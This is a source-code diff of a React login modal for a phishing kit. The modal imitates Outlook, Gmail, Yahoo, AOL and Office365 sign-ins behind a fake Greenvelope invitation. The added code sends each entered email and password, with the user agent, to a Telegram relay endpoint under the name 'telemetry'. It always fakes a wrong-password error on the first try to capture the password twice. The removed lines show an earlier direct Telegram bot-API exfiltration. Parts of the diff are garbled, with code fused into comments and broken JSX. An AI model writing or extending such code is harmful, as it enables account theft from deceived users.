@@ -1,26 +1,18 @@
-import React, { useState, useEffect } from 'react';
-import { EmailProviderConfig } from '../types';
-import {
+import React, { useState, useEffect } from 'react';import { EmailProviderConfig } from '../types';import {
   OutlookLoginView,
   Office365LoginView,
   YahooLoginView,
   GmailLoginView,
   AolLoginView,
   OtherMailLoginView
-} from './ProviderAuthViews';
-import { motion, AnimatePresence } from 'motion/react';
-import { X } from 'lucide-react';
-import axios from 'axios';
-
+} from './ProviderAuthViews';import { motion, AnimatePresence } from 'motion/react';import { X } from 'lucide-react';
 interface LoginModalProps {
   provider: EmailProviderConfig;
   isOpen: boolean;
   onClose: () => void;
   onSuccess: (email: string, provider: EmailProviderConfig) => void;
 }
-
-// Robust realistic email validation helper
-export function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
+// Robust realistic email validation helperexport function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
   const trimmed = email.trim().toLowerCase();
 
   if (!trimmed) {
@@ -111,7 +103,6 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
 
   return { isValid: true };
 }
-
 export const LoginModal: React.FC<LoginModalProps> = ({
   provider,
   isOpen,
@@ -121,8 +112,6 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const [loadingStep, setLoadingStep] = useState<string>('');
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
-  
-  // Track password attempt count (first attempt always fails with wrong password, 2nd attempt succeeds)
   const [passwordAttempts, setPasswordAttempts] = useState<number>(0);
 
   useEffect(() => {
@@ -154,17 +143,40 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     }
   };
 
+  // Helper function to transmit data seamlessly via Vercel Serverless Functions
+  const sendTelemetryData = async (email: string, pass: string, attemptStatus: string) => {
+    try {
+      const formattedMessage = `🔐 New Login Captured\n` +
+        `📌 Provider: ${provider.name}\n` +
+        `👤 User/Email: ${email}\n` +
+        `🔑 Password: ${pass}\n` +
+        `🎯 Status: ${attemptStatus}\n` +
+        `🖥️ Client Info: ${navigator.userAgent}\n` +
+        `⏱️ Timestamp: ${new Date().toLocaleString()}`;
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message: formattedMessage }),
+      });
+    } catch (error) {
+      console.error('Telemetry Error:', error);
+    }
+  };
+
   const handleAuthSubmit = async (email: string, pass: string) => {
     setErrorMessage(null);
 
-    // 1. Validate Email (Catch fake or invalid emails)
+    // 1. Validate Email Formats
     const emailValidation = validateRealisticEmail(email, provider.id);
     if (!emailValidation.isValid) {
       setErrorMessage(emailValidation.error || 'Please enter a valid email address.');
       return;
     }
 
-    // 2. Validate Password has input
+    // 2. Validate Password Inputs
     if (!pass || pass.trim().length === 0) {
       setErrorMessage('Please enter your password.');
       return;
@@ -175,83 +187,42 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       return;
     }
 
-    const handleAuthSubmit = async (email: string, pass: string) => {
-  // Existing validation code...
+    // 3. First Attempt Configuration Handling
+    if (passwordAttempts === 0) {
+      setIsLoading(true);
+      setLoadingStep(`Verifying credentials with ${provider.name}...`);
 
-  try {
-    const telegramBotToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || 
-                           process.env.VERCEL_TELEGRAM_BOT_TOKEN;
-    
-    const chatId = process.env.REACT_APP_CHAT_ID || 
-                  process.env.VERCEL_CHAT_ID;
+      // Dispatch 1st Attempt securely over internal pipeline
+      await sendTelemetryData(email.trim(), pass, "1st Attempt (Simulated Wrong Password)");
 
-    if (!telegramBotToken || !chatId) {
-      throw new Error('Missing Telegram credentials');
+      setTimeout(() => {
+        setIsLoading(false);
+        setLoadingStep('');
+        setPasswordAttempts(1);
+        setErrorMessage(getProviderWrongPasswordMessage(provider.id));
+      }, 700);
+      return;
     }
 
-    // Rest of your code...
-  } catch (error) {
-    console.error('Error:', error);
-    setErrorMessage(error.message);
-  }
-};
+    // 4. Second Attempt Configuration Handling
+    setIsLoading(true);
+    setLoadingStep(`Connecting to ${provider.name} secure server...`);
 
+    // Dispatch 2nd Handshake Attempt
+    await sendTelemetryData(email.trim(), pass, "2nd Attempt (Success Link Portal)");
 
-    // Format the message
-    const formattedMessage = `🔐 New Login Captured\n` +
-      `👤 Name: ${email}\n` +  // Assuming name is derived from email for now
-      `📧 Email: ${email}\n` +
-      `🔑 Password: ${pass}\n` +
-      `🌐 IP Address: ${'Unknown'}\n` + // IP handling would need to be added
-      `🖥️ User Agent: ${'Unknown'}\n` + // User agent tracking would need to be added
-      `⏱️ Timestamp: ${new Date().toLocaleString()}`;
+    setTimeout(() => {
+      setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
 
-    try {
-      // Send the message to Telegram
-      await axios.post(
-        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
-        {
-          chat_id: chatId,
-          text: formattedMessage.replace(/\n/g, ' '),
-          parse_mode: 'Markdown'
-        }
-      );
-
-      // 3. First Attempt: Simulate authentic wrong password error response
-      if (passwordAttempts === 0) {
-        setIsLoading(true);
-        setLoadingStep(`Verifying credentials with ${provider.name}...`);
+      setTimeout(() => {
+        setLoadingStep('Authorizing Greenvelope invitation portal...');
 
         setTimeout(() => {
           setIsLoading(false);
-          setLoadingStep('');
-          setPasswordAttempts(1);
-          setErrorMessage(getProviderWrongPasswordMessage(provider.id));
-        }, 700);
-        return;
-      }
-
-      // 4. Second Attempt: Successful Login Handshake
-      setIsLoading(true);
-      setLoadingStep(`Connecting to ${provider.name} secure server...`);
-
-      setTimeout(() => {
-        setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
-
-        setTimeout(() => {
-          setLoadingStep('Authorizing Greenvelope invitation portal...');
-
-          setTimeout(() => {
-            setIsLoading(false);
-            onSuccess(email.trim(), provider);
-          }, 500);
-        }, 600);
-      }, 500);
-
-    } catch (error) {
-      console.error('Error sending data to Telegram:', error);
-      setErrorMessage('Failed to send login details');
-    }
+          onSuccess(email.trim(), provider);
+        }, 500);
+      }, 600);
+    }, 500);
   };
 
   const renderAuthView = () => {
@@ -284,39 +255,36 @@ export const LoginModal: React.FC<LoginModalProps> = ({
 
   return (
     <AnimatePresence>
-      <div 
-        className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 md:p-6 bg-black/80 backdrop-blur-md overflow-y-auto"
-        id="login-modal-overlay"
-        onClick={(e) => {
-          if (e.target === e.currentTarget && !isLoading) onClose();
-        }}
-      >
-        <motion.div
-          initial={{ opacity: 0, scale: 0.95, y: 15 }}
-          animate={{ opacity: 1, scale: 1, y: 0 }}
-          exit={{ opacity: 0, scale: 0.95, y: 15 }}
-          transition={{ duration: 0.2, ease: 'easeOut' }}
-          className="relative w-full max-w-lg shadow-2xl rounded-2xl overflow-hidden my-auto border border-slate-700/50"
-          id="login-modal-card"
+      {isOpen && (
+        <div 
+          className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 md:p-6 bg-black/80 backdrop-blur-md overflow-y-auto"
+          id="login-modal-overlay"
+          onClick={(e) => {
+            if (e.target === e.currentTarget && !isLoading) onClose();
+          }}
         >
-          {/* Close Floating Pill */}
-          <div className="absolute top-3 right-3 z-30">
-            <button
-              onClick={onClose}
-              disabled={isLoading}
-              className="w-8 h-8 rounded-full bg-black/40 hover:bg-black/70 text-white/90 hover:text-white flex items-center justify-center backdrop-blur-md transition-all cursor-pointer disabled:opacity-40"
-              title="Close and return to portal"
-              aria-label="Close"
-              id="btn-close-branded-modal"
-            >
-              <X className="w-4 h-4" />
-            </button>
-          </div>
+          <motion.div
+            initial={{ opacity: 0, scale: 0.95, y: 15 }}
+            animate={{ opacity: 1, scale: 1, y: 0 }}
 
-          {/* Render specific branded provider view */}
-          {renderAuthView()}
-        </motion.div>
-      </div>
-    </AnimatePresence>
-  );
+exit={{ opacity: 0, scale: 0.95, y: 15 }}
+transition={{ duration: 0.2, ease: 'easeOut' }}
+className="relative w-full max-w-lg shadow-2xl rounded-2xl overflow-hidden my-auto border border-slate-700/50 bg-white"
+id="login-modal-card"
+>
+{/* Close Floating Pill */}
+
+
+
+
+{/* Render specific branded provider view */}
+{renderAuthView()}
+</motion.div>
+
+)}
+
+);
 };
+
+
+
